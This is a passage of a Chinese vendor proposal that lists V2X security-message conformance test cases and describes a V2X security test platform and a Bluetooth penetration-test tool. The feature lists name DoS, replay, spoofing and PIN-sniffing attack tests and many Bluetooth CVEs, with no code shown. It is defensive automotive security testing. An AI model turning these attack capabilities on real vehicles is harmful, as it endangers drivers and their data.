6.1LTE-V2X 证书管理系统架构 — 6.1.9 应用消息签名和验签过程中一致性检查要求— 待签数据产生时间过早</td></tr><tr><td>31</td><td>安全消息验证测试</td><td>待签数据产生时间过晚测试</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.1LTE-V2X 证书管理系统架构 — 6.1.9 应用消息签名和验签过程中一致性检查要求— 待签数据产生时间过早</td></tr><tr><td>32</td><td>安全消息验证测试</td><td>待签数据应用信息非法测试</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.1LTE-V2X 证书管理系统架构 — 6.1.9 证书一致性检查要求— 待签数据应用信息非法</td></tr><tr><td>33</td><td>安全消息验证测试</td><td>待签数据杂凑算法非法测试</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 附录D — 待签数据杂凑算法非法</td></tr><tr><td>34</td><td>安全消息验证测试</td><td>数字证书版本号信息非法测试</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.5数字证书和证书管理数据格式 — 6.5.3 CertificateBase— 数据证书版本号错误</td></tr><tr><td>35</td><td>安全消息验证测试</td><td>证书有效期非法测试</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.1LTE-V2X 证书管理系统架构 — 6.1.9 证书一致性检查要求— 证书有效期</td></tr><tr><td>36</td><td>安全消息验证测试</td><td>签名数据内容aid非法测试_111</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.1LTE-V2X 证书管理系统架构 — 6.1.9 应用消息签名和验签过程中一致性检查要求— 安全消息证书应用权限非法</td></tr><tr><td>37</td><td>安全消息验证测试</td><td>签名数据内容aid非法测试_117</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.1LTE-V2X 证书管理系统架构 — 6.1.9 应用消息签名和验签过程中一致性检查要求— 安全消息证书应用权限非法</td></tr><tr><td>38</td><td>安全消息验证测试</td><td>签名数据内容aid非法测试_118</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.1LTE-V2X 证书管理系统架构 — 6.1.9 应用消息签名和验签过程中一致性检查要求— 安全消息证书应用权限非法</td></tr><tr><td>39</td><td>安全消息验证测试</td><td>签名数据内容aid非法测试_119</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.1LTE-V2X 证书管理系统架构 — 6.1.9 应用消息签名和验签过程中一致性检查要求— 安全消息证书应用权限非法</td></tr><tr><td>40</td><td>安全消息验证测试</td><td>签名数据内容aid非法测试_120</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.1LTE-V2X 证书管理系统架构 — 6.1.9 应用消息签名和验签过程中一致性检查要求— 安全消息证书应用权限非法</td></tr><tr><td>41</td><td>安全消息验证测试</td><td>待签数据杂凑算法非法测试_0</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 附录D — 待签数据杂凑算法非法</td></tr><tr><td>42</td><td>安全消息验证测试</td><td>待签数据杂凑算法非法测试_1</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 附录D — 待签数据杂凑算法非法</td></tr><tr><td>43</td><td>安全消息验证测试</td><td>待签数据杂凑算法非法测试_2</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 附录D — 待签数据杂凑算法非法</td></tr><tr><td>44</td><td>安全消息验证测试</td><td>数字证书版本号信息非法测试_1</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.5数字证书和证书管理数据格式 — 6.5.3 CertificateBase— 数据证书版本号错误</td></tr><tr><td>45</td><td>安全消息验证测试</td><td>数字证书版本号信息非法测试_1</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.5数字证书和证书管理数据格式 — 6.5.3 CertificateBase— 数据证书版本号错误</td></tr><tr><td>46</td><td>安全消息验证测试</td><td>数字证书版本号信息非法测试_2</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.5数字证书和证书管理数据格式 — 6.5.3 CertificateBase— 数据证书版本号错误</td></tr><tr><td>47</td><td>安全消息验证测试</td><td>数字证书版本号信息非法测试_3</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.5数字证书和证书管理数据格式 — 6.5.3 CertificateBase— 数据证书版本号错误</td></tr><tr><td>48</td><td>安全消息验证测试</td><td>数字证书版本号信息非法测试_4</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.5数字证书和证书管理数据格式 — 6.5.3 CertificateBase— 数据证书版本号错误</td></tr><tr><td>49</td><td>安全消息验证测试</td><td>数字证书版本号信息非法测试_5</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.5数字证书和证书管理数据格式 — 6.5.3 CertificateBase— 数据证书版本号错误</td></tr><tr><td>50</td><td>安全消息验证测试</td><td>安全消息版本号非法测试_1</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.4 安全协议数据单元（SPDU） — 6.4.1 V2XSecData— 安全版本号填充错误</td></tr><tr><td>51</td><td>安全消息验证测试</td><td>安全消息版本号非法测试_2</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.4 安全协议数据单元（SPDU） — 6.4.1 V2XSecData— 安全版本号填充错误</td></tr><tr><td>52</td><td>安全消息验证测试</td><td>安全消息版本号非法测试_3</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.4 安全协议数据单元（SPDU） — 6.4.1 V2XSecData— 安全版本号填充错误</td></tr><tr><td>53</td><td>安全消息验证测试</td><td>安全消息版本号非法测试_4</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.4 安全协议数据单元（SPDU） — 6.4.1 V2XSecData— 安全版本号填充错误</td></tr><tr><td>54</td><td>安全消息验证测试</td><td>安全消息版本号非法测试_5</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.4 安全协议数据单元（SPDU） — 6.4.1 V2XSecData— 安全版本号填充错误</td></tr><tr><td>55</td><td>安全消息验证测试</td><td>签名数据内容SPUD版本号信息非法_1</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.5数字证书和证书管理数据格式 — 6.5.3 CertificateBase— 数据证书版本号错误</td></tr><tr><td>56</td><td>安全消息验证测试</td><td>签名数据内容SPUD版本号信息非法_2</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.5数字证书和证书管理数据格式 — 6.5.3 CertificateBase— 数据证书版本号错误</td></tr><tr><td>57</td><td>安全消息验证测试</td><td>签名数据内容SPUD版本号信息非法_3</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.5数字证书和证书管理数据格式 — 6.5.3 CertificateBase— 数据证书版本号错误</td></tr><tr><td>58</td><td>安全消息验证测试</td><td>签名数据内容SPUD版本号信息非法_4</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.5数字证书和证书管理数据格式 — 6.5.3 CertificateBase— 数据证书版本号错误</td></tr><tr><td>59</td><td>安全消息验证测试</td><td>签名数据内容SPUD版本号信息非法_5</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.5数字证书和证书管理数据格式 — 6.5.3 CertificateBase— 数据证书版本号错误</td></tr><tr><td>60</td><td>安全消息验证测试</td><td>待签数据产生时间过晚测试_过晚</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.1LTE-V2X 证书管理系统架构 — 6.1.9 应用消息签名和验签过程中一致性检查要求— 待签数据产生时间过早</td></tr><tr><td>61</td><td>安全消息验证测试</td><td>待签数据产生时间过晚测试_正常</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.1LTE-V2X 证书管理系统架构 — 6.1.9 应用消息签名和验签过程中一致性检查要求— 待签数据产生时间过早</td></tr><tr><td>62</td><td>安全消息验证测试</td><td>待签数据产生时间过晚测试_过早</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.1LTE-V2X 证书管理系统架构 — 6.1.9 应用消息签名和验签过程中一致性检查要求— 待签数据产生时间过早</td></tr><tr><td>63</td><td>安全消息验证测试</td><td>待签数据应用信息非法测试_116</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.1LTE-V2X 证书管理系统架构 — 6.1.9 应用消息签名和验签过程中一致性检查要求— 安全消息证书应用权限非法</td></tr><tr><td>64</td><td>安全消息验证测试</td><td>待签数据应用信息非法测试_117</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.1LTE-V2X 证书管理系统架构 — 6.1.9 应用消息签名和验签过程中一致性检查要求— 安全消息证书应用权限非法</td></tr><tr><td>65</td><td>安全消息验证测试</td><td>安全消息签名信息非法测试_0</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 4.2V2X 通信安全服务架构 — 4.2.2 通信安全协议数据单元 — 安全消息签名信息非法测试</td></tr><tr><td>66</td><td>安全消息验证测试</td><td>安全消息签名信息非法测试_1</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 4.2V2X 通信安全服务架构 — 4.2.2 通信安全协议数据单元 — 安全消息签名信息非法测试</td></tr><tr><td>67</td><td>安全消息验证测试</td><td>安全消息签名信息非法测试_2</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 4.2V2X 通信安全服务架构 — 4.2.2 通信安全协议数据单元 — 安全消息签名信息非法测试</td></tr><tr><td>68</td><td>安全消息验证测试</td><td>安全消息签名信息非法测试_3</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 4.2V2X 通信安全服务架构 — 4.2.2 通信安全协议数据单元 — 安全消息签名信息非法测试</td></tr><tr><td>69</td><td>安全消息验证测试</td><td>待签数据应用信息非法测试_115</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.1LTE-V2X 证书管理系统架构 — 6.1.9 证书一致性检查要求— 待签数据应用信息非法</td></tr><tr><td>70</td><td>安全消息验证测试</td><td>待签数据应用信息非法测试_116</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.1LTE-V2X 证书管理系统架构 — 6.1.9 证书一致性检查要求— 待签数据应用信息非法</td></tr><tr><td>71</td><td>安全消息验证测试</td><td>待签数据应用信息非法测试_117</td><td>YDT 3957-2021 基于 LTE 的车联网无线通信技术 安全证书管理系统技术要求 — 6.1LTE-V2X 证书管理系统架构 — 6.1.9 证书一致性检查要求— 待签数据应用信息非法</td></tr></tbody></table><h4 id="外场测试用例库（V2X功能场景）"><a href="#外场测试用例库（V2X功能场景）" class="headerlink" title="外场测试用例库（V2X功能场景）"></a>外场测试用例库（V2X功能场景）</h4><p>我司为本项目的测试用例涵盖了整车V2V及V2I应用场景（国标内除近场支付外的16个场景）的通信安全检查和隐私保护检查。测试用例覆盖内容如下：</p><table><thead><tr><th><strong>序号</strong></th><th><strong>测试分类</strong></th><th><strong>测试用例名称</strong></th><th><strong>标准相关技术指标</strong></th></tr></thead><tbody><tr><td>1</td><td>隐私保护</td><td>假名证书不变测试（低速）</td><td>基于LTE-V2X直连通信的车载信息交互系统技术要求及试验方法 — 6.4.4隐私保护要求 — 6.4.4.2假名证书改变 — 距离没有超过2千米</td></tr><tr><td>2</td><td>隐私保护</td><td>假名证书不变测试（静止）</td><td>基于LTE-V2X直连通信的车载信息交互系统技术要求及试验方法 — 6.4.4隐私保护要求 — 6.4.4.2假名证书改变 — 关键事件产生并恢复，没有切换证书</td></tr><tr><td>3</td><td>隐私保护</td><td>假名证书及摘要切换策略测试</td><td>基于LTE-V2X直连通信的车载信息交互系统技术要求及试验方法 — 6.4.4隐私保护要求 — 6.4.4.2假名证书改变 — 时间超过5分钟，距离超过2千米，没有切换证书</td></tr><tr><td>4</td><td>隐私保护</td><td>假名证书改变测试（无关键事件）</td><td>基于LTE-V2X直连通信的车载信息交互系统技术要求及试验方法 — 6.4.4隐私保护要求 — 6.4.4.2假名证书改变 — 关键事件产生并恢复，没有切换证书</td></tr><tr><td>5</td><td>隐私保护</td><td>假名证书改变测试（触发关键事件）</td><td>基于LTE-V2X直连通信的车载信息交互系统技术要求及试验方法 — 6.4.4隐私保护要求 — 6.4.4.2假名证书改变 — 关键事件产生切换证书</td></tr><tr><td>6</td><td>隐私保护</td><td>安全消息填充及通信安全基本要求测试</td><td>基于LTE-V2X直连通信的车载信息交互系统技术要求及试验方法 — 6.4.4隐私保护要求 — 6.4.4.2假名证书改变 — 关键事件产生并恢复，没有切换证书</td></tr><tr><td>7</td><td>隐私保护</td><td>标识随机化测试</td><td>基于LTE-V2X直连通信的车载信息交互系统技术要求及试验方法 — 6.4.3隐私保护要求 — 6.4.4.2假名证书改变 — 时间没有超过五分钟</td></tr><tr><td>8</td><td>隐私保护</td><td>车辆历史轨迹隐私保护测试</td><td>基于LTE-V2X直连通信的车载信息交互系统技术要求及试验方法 — 6.4.4隐私保护要求 — 6.4.4.2假名证书改变 — 关键事件产生并恢复，没有切换证书</td></tr></tbody></table><h3 id="V2X安全检测平台"><a href="#V2X安全检测平台" class="headerlink" title="V2X安全检测平台"></a>V2X安全检测平台</h3><h4 id="V2X安全检测平台技术方案"><a href="#V2X安全检测平台技术方案" class="headerlink" title="V2X安全检测平台技术方案"></a>V2X安全检测平台技术方案</h4><p>1. 概述</p><p>本技术方案旨在构建一个全面的V2X（Vehicle-to-Everything）安全检测平台，以支持OBU（On-Board Unit）和RSU（Road-Side Unit）的综合测试。该平台将提供多层次的安全验证，包括身份认证、消息签名和隐私保护等，以确保V2X通信的安全性和可靠性。</p><p>2. 方案组成</p><p>2.1 适用范围</p><p>支持OBU和RSU测试，确保覆盖车辆与基础设施之间的所有通信安全测试需求。</p><p>2.2 接口参数</p><p>支持LTE-V标准，以确保与当前车联网通信技术的兼容性。</p><p>提供嵌入式API和支持二次开发，以适应各种定制化测试需求。</p><p>提供以太网、串口、USB和CAN等多种的网络数据接口，实现与各类设备的高效连接。</p><p>2.3 可扩展性</p><p>平台提供回调接口，推送检测结果到外部平台，以便于集成和数据共享。</p><p>接口类型支持开发方自定义，提供灵活性以适应不同的测试场景。</p><p>平台提供所需的所有检测工具和测试用例代码，支持手动调试及二次开发。</p><p>2.4 V2X安全机制验证</p><p>基于PKI/CA技术的授权证书管理，确保所有通信实体的合法性。</p><p>消息签名验证，以验证消息的完整性和非抵赖性。</p><p>假名证书变更策略，以保护用户隐私。</p><p>重放防御机制，防止旧消息的重新发送造成的安全威胁。</p><p>结合OBU、RSU设备，全面验证V2X安全方案。</p><p>2.5 系统网络</p><p>整个系统支持Wi-Fi无线网络搭建，实现灵活的测试环境部署。</p><p>Wi-Fi路由器开启热点接入功能，便于测试设备的快速接入和通信。</p><p>2.6 V2X通信身份认证测试</p><p>支持测试合法证书、无效证书或非法证书，以验证身份认证机制的有效性。</p><p>2.7 构建V2X标准协议相符性测试系统</p><p>在实验室环境下构建用于验证V2X无线通信设备的标准协议相符性测试系统。</p><p>2.8 测试组件实现</p><p>安全层协议一致性测试及协议变异</p><p>使用LTE-V2X通信安全协议一致性测试文件夹中的TCI指令控制被测设备。</p><p>测试用例分为：签发SPDU测试、验签SPDU测试及安全消息验证测试。详细接口规范参考《基于LTE的车联网无线通信技术 通信安全协议一致性测试控制接口规范_202008》。</p><p>隐私保护测试及协议变异</p><p>消息层测试中，使用LTE-V2X消息层协议一致性测试文件夹中的TCI指令控制OBU，发送BSM测试。</p><p>详细接口规范参考《基于LTE的车联网无线通信技术 通信安全隐私保护测试控制接口规范_202206》。</p><p>2.9 自动化测试方案</p><p>V2X标准相符性测试系统与被测试设备间遵照测试控制接口实现自动化测试。</p><p>V2X通信拒绝服务攻击识别：支持构建150辆可与测试车辆正常通信的虚拟车辆，可以任选一辆虚拟车辆发起拒绝服务攻击，验证车辆对恶意的V2X消息数据的识别功能。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/28b83ff45c003265760264e6385e426d.png" alt="1703520111701"></p><p>V2X通信拓扑</p><p>软件功能</p><p>图形用户界面(GUI): 提供直观的操作界面，实现一键式测试流程，用户可通过GUI监控实时数据、配置测试参数和查看历史记录。</p><p>协议栈管理: 支持各类V2X通信协议的配置，包括但不限于IEEE 1609系列、ISO CALM系列等。</p><p>自动化测试: 支持用户自定义测试脚本，实现自动化测试。</p><p>模式切换: 用户可根据测试需求，轻松切换仿真模式和实车测试模式。</p><p>测试场景</p><p>预定义场景: 提供一系列的标准测试场景，如紧急制动、车道变更、交通信号优先等。</p><p>场景编辑器: 用户可以通过场景编辑器自定义复杂的交通场景，以模拟现实世界中的各种情况。</p><p>第三方仿真软件集成: 支持与SUMO等仿真软件的接口，实现更加复杂的交通流模拟。</p><p>数据分析与报告</p><p>实时监控: 实时捕获和显示V2X通信数据，包括消息内容、发送/接收时间等。</p><p>性能评估: 通过分析通信延迟、丢包率、吞吐量等关键性能指标，评估V2X系统性能。</p><p>报告生成: 自动化生成测试报告，包括图表和关键性能指标，以便于技术人员分析和决策。</p><p>安全性测试</p><p>安全协议测试: 测试V2X通信中的加密、签名和认证机制。</p><p>SCMS支持: 集成安全凭证管理系统，用于测试和验证V2X消息的安全性。</p><p>攻击模拟: 模拟各种安全攻击场景，如重放攻击、欺骗攻击等，以验证系统的安全性</p><p>本V2X安全检测平台将为车联网的安全性提供全面的测试解决方案，通过模拟各种攻击场景和协议不一致性，确保V2X系统的健壮性和可靠性。此外，平台的高度可扩展性和自动化测试能力将极大提高测试效率，为V2X通信安全提供坚实的保障。</p><h4 id="V2X安全检测平台技术参数"><a href="#V2X安全检测平台技术参数" class="headerlink" title="V2X安全检测平台技术参数"></a>V2X安全检测平台技术参数</h4><p>V2X安全检测平台技术参数如下：</p><p>（1）适用范围：支持OBU和RSU测试。</p><p>（2）接口参数：支持LTE-V，提供嵌入式API，支持二次开发，提供以太网、串口、USB和CAN等多种的网络数据接口。</p><p>（3）可扩展性：平台提供回调接口，推送检测结果到外部平台。接口类型支持开发方自定义。平台提供所需的所有检测工具，测试用例代码，平台支持手动调试及二次开发。</p><p>（4）V2X安全机制验证：基于PKI/CA技术的授权证书管理、消息签名验证、假名证书变更策略、重放防御等机制，结合OBU、RSU设备，验证V2X安全方案。</p><p>（5）系统网络：整个系统支持Wi-Fi无线网络搭建，Wi-Fi路由器开启热点接入功能。</p><p>（6）V2X通信身份认证测试：支持测试合法证书、无效证书或非法证书。</p><p>（7）构建V2X标准协议相符性测试系统</p><p>在实验室环境下构建用于验证V2X无线通信设备的标准协议相符性测试系统。</p><p>（8）测试组件实现</p><ol><li>安全层协议一致性测试及协议变异</li></ol><p>安全层测试中，使用LTE-V2X通信安全协议一致性测试文件夹中的TCI指令对被测设备进行控制，测试用例分为：签发SPDU测试、验签SPDU测试及安全消息验证测试。详细接口规范参考《基于LTE的车联网无线通信技术 通信安全协议一致性测试控制接口规范_202008》。</p><ol start="2"><li>隐私保护测试及协议变异</li></ol><p>消息层测试中，使用LTE-V2X消息层协议一致性测试文件夹中的TCI指令对被测设备进行控制，对于OBU，发送BSM测试。详细接口规范参考《基于LTE的车联网无线通信技术 通信安全隐私保护测试控制接口规范_202206》。</p><p>（9）自动化测试</p><p>V2X标准相符性测试系统与被测试设备间遵照测试控制接口实现自动化测试。</p><ol><li>V2X通信拒绝服务攻击识别：支持构建150辆可与测试车辆正常通信的虚拟车辆，可以任选一辆虚拟车辆发起拒绝服务攻击，验证车辆对恶意的V2X消息数据的识别功能。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/bf0e63f687d63ba6affa5f54122a6fb5.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/0bd56530490e1bbb494bac5b778300ec.png"></p><h1 id="智能汽车网络靶场工具库-业务安全测试工具"><a href="#智能汽车网络靶场工具库-业务安全测试工具" class="headerlink" title="智能汽车网络靶场工具库-业务安全测试工具"></a>智能汽车网络靶场工具库-业务安全测试工具</h1><h2 id="总体概述-2"><a href="#总体概述-2" class="headerlink" title="总体概述"></a>总体概述</h2><p>我司为本项目提供的智能汽车网络靶场工具库-业务安全测试工具可覆盖零部件、台架、整车相关的业务安全测试，工具包括蓝牙安全测试工具、蓝牙协议分析工具、WIFI安全测试工具、射频钥匙安全测试工具、OTA测试工具、CAN/LIN总线安全测试工具、车载以太网安全验证工具、车辆信号模拟仿真软件等。测试依据覆盖《WP.29 R155》、《WP.29 R156》《车载信息交互系统信息安全技术要求及试验方法》、《电动汽车远程信息服务与管理系统信息安全技术要求》、《汽车网关信息安全技术要求及试验方法》等。</p><p>业务安全测试工具采用便携式外观，搭配测试终端PC或者笔记本电脑，可实现随时随地测试，测试工具附带储物空间，可收纳、扩展各类常用测试工具，如各类CAN盒子。</p><p>智能汽车网络靶场工具库-业务安全测试工具包含蓝牙安全测试工具、蓝牙协议分析工具、WIFI安全测试工具、射频钥匙安全测试工具等。</p><h2 id="蓝牙安全测试工具"><a href="#蓝牙安全测试工具" class="headerlink" title="蓝牙安全测试工具"></a>蓝牙安全测试工具</h2><h3 id="工具概述"><a href="#工具概述" class="headerlink" title="工具概述"></a>工具概述</h3><p>蓝牙安全测试工具同时支持对低功耗蓝牙和经典蓝牙的测试，满足对智能网联汽车的蓝牙通信模块进行全面的合规及渗透测试能力。</p><h3 id="工具方案"><a href="#工具方案" class="headerlink" title="工具方案"></a>工具方案</h3><p>蓝牙安全测试工具是一款便携式设备，旨在支持对经典蓝牙和低功耗蓝牙进行安全测试。该工具具备多项功能，包括蓝牙安全测试、数据加密测试、拒绝服务攻击测试、协议栈漏洞测试等。工具采用便携式设计，支持自适应以太网口，具备用户友好的界面和高级功能，以满足用户的安全测试需求。</p><h4 id="硬件方案"><a href="#硬件方案" class="headerlink" title="硬件方案"></a>硬件方案</h4><p>外观：便携式设计，方便携带和使用。</p><p>网络接口：支持1路10M/100M/1000M自适应以太网口，用于与测试对象进行连接和通信。</p><h4 id="软件方案"><a href="#软件方案" class="headerlink" title="软件方案"></a>软件方案</h4><p>前端设计：</p><p>用户界面：设计直观、用户友好的界面，使用户能够方便地进行操作和管理。</p><p>功能模块：将各项功能划分为不同的模块，如蓝牙测试模块、任务管理模块、数据管理模块等。</p><p>数据展示：通过图表、表格等方式展示测试结果和相关数据，以便用户进行分析和评估。</p><p>后端设计：</p><p>服务器端：搭建服务器端，用于处理前端请求、执行相应的测试任务和数据处理。</p><p>数据库：设计数据库用于存储测试对象信息、测试任务信息、测试结果数据等。</p><p>任务管理：实现任务管理功能，包括新增、编辑、删除、搜索、配置用例、开始检测和查看结果等操作。</p><p>测试功能：实现各项测试功能，如蓝牙安全测试、数据加密测试、拒绝服务攻击测试、协议栈漏洞测试等。</p><p>数据和日志管理：记录和管理测试过程中产生的测试数据和操作日志，以便用户查看和导出。</p><p>安全通信：在安全通信方面，我司采用了SSL的方式进行了加密通信，这是为了保障安全的进行数据传输。</p><p>数据导出和报告：</p><p>数据导出：支持将测试结果数据导出为常见格式，如CSV、Excel等，以便用户进行进一步的数据分析和处理。</p><p>报告生成：根据测试结果自动生成测试报告，包括测试概要、测试结果、修复建议等内容。</p><p>报告导出：支持将测试报告导出为PDF格式，以便用户进行存档、分享和提交给相关方。</p><p>用户权限和安全：</p><p>用户身份验证：实现用户身份验证机制，确保只有授权用户可以访问和使用工具。</p><p>用户权限管理：设置不同的用户权限，限制用户对工具的操作和访问范围。</p><p>安全性考虑：在开发过程中，注重安全性，防止潜在的安全漏洞和攻击。</p><p>扩展性和可维护性：</p><p>扩展性：设计具有良好扩展性的架构，以方便后续添加新的功能模块和测试功能。</p><p>可维护性：采用合适的编程规范和设计模式，使代码易于维护和修改。</p><h4 id="工具功能"><a href="#工具功能" class="headerlink" title="工具功能"></a>工具功能</h4><p>蓝牙测试：支持对经典蓝牙和低功耗蓝牙进行安全测试。</p><p>蓝牙信息显示：显示蓝牙地址、蓝牙名称和RSSI信号强度等相关信息。</p><p>经典蓝牙数据加密测试：测试经典蓝牙连接的数据加密性能。</p><p>经典蓝牙拒绝服务攻击测试：模拟经典蓝牙的拒绝服务攻击，评估系统的鲁棒性。</p><p>经典蓝牙连接占用测试：测试经典蓝牙连接的资源占用情况。</p><p>经典蓝牙协议栈漏洞测试：测试经典蓝牙协议栈中的漏洞，包括CVE-2017-1000250、CVE-2017-1000251、CVE-2020-12352、CVE-2020-12351等。</p><p>低功耗蓝牙数据加密测试：测试低功耗蓝牙连接的数据加密性能。</p><p>低功耗蓝牙BLE pin码嗅探测试：测试低功耗蓝牙BLE连接的PIN码嗅探能力。</p><p>低功耗蓝牙重放测试：测试低功耗蓝牙连接的重放攻击防护能力。</p><p>低功耗蓝牙从机连接占用测试：测试低功耗蓝牙从机连接的资源占用情况。</p><p>低功耗蓝牙拒绝服务攻击测试：模拟低功耗蓝牙的拒绝服务攻击，评估系统的鲁棒性。</p><p>低功耗蓝牙协议栈漏洞测试：测试低功耗蓝牙协议栈中的漏洞，包括CVE-2017-1000250、CVE-2017-1000251、CVE-2020-12352、CVE-2020-12351、CVE-2019-17519、CVE-2019-16336、CVE-2019-17517、CVE-2019-17518、CVE-2019-17520、CVE-2019-19195、CVE-2019-19196、CVE-2020-10061、CVE-2020-10069、CVE-2020-13594、CVE-2019-17061、CVE-2019-17060、CVE-2019-19192、CVE-2019-19193、CVE-2020-13595、CVE-2019-19194、CVE-2020-13593等。</p><p>高级功能支持：包括蓝牙（经典/低功耗）嗅探等高级功能。</p><p>测试对象管理：支持对测试对象进行新增、删除、修改和搜索等操作。</p><p>任务管理：在任务管理页面，用户可以新增、编辑、删除、搜索、配置用例、开始检测和查看结果等操作。</p><p>测试对象与任务关联：一个测试对象可以对应多个测试任务，方便管理和组织测试。</p><p>数据和日志管理：支持显示和导出测试过程中产生的测试数据和操作日志。</p><p>测试报告导出：支持将测试结果导出为PDF格式的测试报告，并对不通过的测试用例提出修复建议。</p><p>安全通信：工具采用B/S设计架构，通过SSL加密通信方式，用户可以通过浏览器远程方便地进行管理。</p><h3 id="产品彩页-8"><a href="#产品彩页-8" class="headerlink" title="产品彩页"></a>产品彩页</h3><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/91bb3320902a9fe6a568e328f11cb03b.png"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/51582c8d2feb4438b122dc03f26ef258.png"></p><h3 id="工具参数"><a href="#工具参数" class="headerlink" title="工具参数"></a>工具参数</h3><p>功能参数如下：</p><p>我司为本项目提供的该产品信息如下：</p><p>品牌：国利</p><p>型号：GLBT226</p><p>数量：2套</p><p>指标参数信息如下：</p><ol><li>外观采用便携式设计；</li><li>支持1路10M/100M/1000M自适应以太网口</li><li>支持对经典蓝牙和低功耗蓝牙进行安全测试；</li><li>支持蓝牙地址显示、蓝牙名称、RSSI信号强度等；</li><li>支持经典蓝牙数据加密测试；</li><li>支持经典蓝牙的拒绝服务攻击测试；</li><li>支持经典蓝牙连接占用测试；</li><li>支持经典蓝牙协议栈漏洞测试，包含：CVE-2017-1000250、CVE-2017-1000251、CVE-2020-12352、CVE-2020-12351等；已提供相关视频佐证，视频链接：<a href="https://pan.baidu.com/s/188QF5S2Nd9lYXTAl1big9A?pwd=c1ix">https://pan.baidu.com/s/188QF5S2Nd9lYXTAl1big9A?pwd=c1ix</a> 。提取码：c1ix。</li><li>支持低功耗蓝牙数据加密测试；</li><li>支持低功耗蓝牙BLE pin码嗅探测试；</li><li>支持低功耗蓝牙重放测试；</li><li>支持低功耗蓝牙从机连接占用测试；</li><li>支持低功耗蓝牙的拒绝服务攻击测试；</li><li>支持低功耗蓝牙协议栈漏洞测试，包含：CVE-2017-1000250、CVE-2017-1000251、CVE-2020-12352、CVE-2020-12351、CVE-2019-17519、CVE-2019-16336、CVE-2019-17517、CVE-2019-17518、CVE-2019-17520、CVE-2019-19195、CVE-2019-19196、CVE-2020-10061、CVE-2020-10069、CVE-2020-13594、CVE-2019-17061、CVE-2019-17060、CVE-2019-19192、CVE-2019-19193、CVE-2020-13595、CVE-2019-19194、CVE-2020-13593等；功能的界面截图如下所示：</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/aa5e69138e78d92ee11202c167e061bf.png" 